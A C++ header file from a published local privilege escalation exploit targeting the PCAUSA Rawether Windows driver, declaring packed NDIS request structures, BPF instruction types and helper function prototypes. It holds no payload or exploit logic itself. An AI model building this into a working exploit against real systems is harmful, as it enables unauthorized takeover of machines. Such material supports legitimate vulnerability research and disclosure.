/**
*
* PCAUSA Rawether for Windows local privilege escalation
*
* Copyright (c) 2017 ReWolf
* http://blog.rewolf.pl/
* http://blog.rewolf.pl/blog/?p=1778
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU Lesser General Public License as published
* by the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU Lesser General Public License for more details.
*
* You should have received a copy of the GNU Lesser General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/
#pragma once
#define WIN32_NO_STATUS
#include <Windows.h>
#undef WIN32_NO_STATUS
#include <string>

#pragma pack(push, 1)
typedef DWORD _NDIS_REQUEST_TYPE;

struct bpf_insn
{
	unsigned __int16 code;
	char jt;
	char jf;
	unsigned int k;
	bpf_insn(unsigned __int16 code, char jt, char jf, unsigned int k) : code(code), jt(jt), jf(jf), k(k) {}
};

struct _RETH_QUERY_INFORMATION
{
	unsigned int Oid;
	__unaligned __declspec(align(1)) void *InformationBuffer;
	unsigned int InformationBufferLength;
	unsigned int BytesWritten;
	unsigned int BytesNeeded;
};

struct _RETH_SET_INFORMATION
{
	unsigned int Oid;
	__unaligned __declspec(align(1)) void *InformationBuffer;
	unsigned int InformationBufferLength;
	unsigned int BytesRead;
	unsigned int BytesNeeded;
};

union _RETH_DATA
{
	_RETH_QUERY_INFORMATION QUERY_INFORMATION;
	_RETH_SET_INFORMATION SET_INFORMATION;
};

struct _RETH_NDIS_REQUEST
{
	char MacReserved[16];
	_NDIS_REQUEST_TYPE RequestType;
	_RETH_DATA DATA;
};

struct _RETH_REQUEST
{
	int nRequestStatus;
	_RETH_NDIS_REQUEST NdisRequest;
	char Reserved[512];
};
#pragma pack(pop)

bool OpenAdapter(HANDLE hDevice, const std::wstring& adapterName);
bool MakeNdisRequest(HANDLE hDevice, _RETH_REQUEST *inBuffer);
bool MakeNdisRequest_OID_GEN_CURRENT_PACKET_FILTER(HANDLE hDevice, int packetType);
bool SetBPFProgram(HANDLE hDevice, bpf_insn *bpfProgram, DWORD bpfProgramSize);
bool Read(HANDLE hDevice, BYTE* buf, DWORD size);
